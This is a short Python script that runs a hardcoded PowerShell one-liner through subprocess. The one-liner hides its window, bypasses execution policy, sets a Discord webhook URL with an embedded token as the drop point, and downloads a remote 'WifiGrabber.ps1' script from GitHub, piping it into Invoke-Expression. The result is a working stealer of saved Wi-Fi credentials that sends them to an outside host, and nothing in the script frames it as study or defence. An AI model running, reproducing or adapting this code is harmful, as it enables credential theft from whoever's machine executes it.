import subprocess

def execute_powershell_command(command):
    try:
        result = subprocess.run(["powershell.exe", "-Command", command], capture_output=True, text=True, shell=True)
        return result.stdout, result.stderr
    except Exception as e:
        return None, str(e)

if __name__ == "__main__":
    powershell_command = "powershell -w h -NoP -Ep Bypass $db='';$dc='https://discord.com/api/webhooks/1143896132548837396/KAnRerfgL_RAXItyby6bIuUjgYqBsVzeI1zYXvdeh8GP5tq_9bXo3PEzzuwZWYaRLrN0';irm https://raw.githubusercontent.com/lcandini/wifi-capture/main/WifiGrabber.ps1 | iex; Start-Sleep -Seconds 1; exit"  # Substitua isso pelo comando PowerShell que você deseja executar
    stdout, stderr = execute_powershell_command(powershell_command)
    
    if stdout:
        print("Output:")
        print(stdout)
    if stderr:
        print("Error:")
        print(stderr)
